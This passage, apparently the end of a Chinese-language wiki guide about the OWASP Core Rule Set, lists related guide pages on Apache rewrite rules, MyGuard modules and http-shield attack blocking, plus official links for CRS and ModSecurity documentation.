- [[060-02-03-04-guide-Apache-htaccess與Rewrite]] —— Apache 對照
- [[060-02-05-01-guide-MyGuard-MyGuard套件庫介紹]] —— ★★★ CRS 外掛與強化模組
- [[060-02-05-04-guide-http-shield攻擊攔截]] —— 與 CRS 互補的攻擊鏈攔截
- [[060-02-05-08-guide-MyGuard-MyGuard實戰組合]]

### 官方資源

| 資源 | 網址 |
| --- | --- |
| OWASP CRS 官網 | <https://coreruleset.org/> |
| CRS 原始碼 | <https://github.com/coreruleset/coreruleset> |
| CRS 文件 | <https://coreruleset.org/docs/> |
| ModSecurity 參考手冊 | <https://github.com/owasp-modsecurity/ModSecurity/wiki> |
